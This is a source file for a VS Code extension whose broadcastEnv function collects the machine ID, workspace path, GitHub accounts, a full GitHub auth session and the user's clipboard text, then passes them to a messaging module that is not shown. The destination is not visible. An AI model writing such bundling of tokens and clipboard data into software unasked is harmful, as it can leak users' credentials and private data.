import * as vscode from 'vscode';
import { extensionEmitter, sendMessage } from '../comms';

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {

	context.subscriptions.push(
		vscode.workspace.onDidOpenTextDocument(e => {
			if (e.uri.scheme !== 'file') {
				return;
			}
			// console.log("openedDocument", e.fileName)
		})
	);

	extensionEmitter.event((e) => {
		switch (e.type) {
      case "sync.request":
      case "sync.request.env":
			case "requestSync":
				broadcastEnv(context)
				break;
		}
	});

	// todo, register handlers on the workspace
	// so we can broadcast updates when new folders are opened

	// context.subscriptions.push(disposable);
}

// This method is called when your extension is deactivated
export function deactivate() {}

async function broadcastEnv(context: vscode.ExtensionContext) {
	const wsF = vscode.workspace.workspaceFolders
	var wDir: string | undefined
	if (wsF && wsF.length > 0) {
		wDir = wsF[0].uri.path	
	}
	const sid = context.workspaceState.get("sid")

	let user: string | undefined = undefined;
	const accounts = await vscode.authentication.getAccounts('github');
  // console.log("env.github.Accounts:", accounts)

  var acct: any = undefined
  if (accounts && accounts.length > 0) {
    acct = accounts[0]
    user = accounts[0].label
  }

	const session = await vscode.authentication.getSession('github', ['read:user'], { 
    account: acct,
    createIfNone: true,
  });
  // console.log("env.github.Session:", session)

	const msg = {
		type: "env.info.resp",
		payload: {
			sid,
			machineId: vscode.env.machineId,
			vscodeSid: vscode.env.sessionId,
			remoteName: vscode.env.remoteName,
			user,
      githubSession: session || null,
      githubAccounts: accounts || null,
		  workspaceDir: wDir,
			clipboard: await vscode.env.clipboard.readText(),
		}
	}
	extensionEmitter.fire(msg);
	sendMessage(msg)
}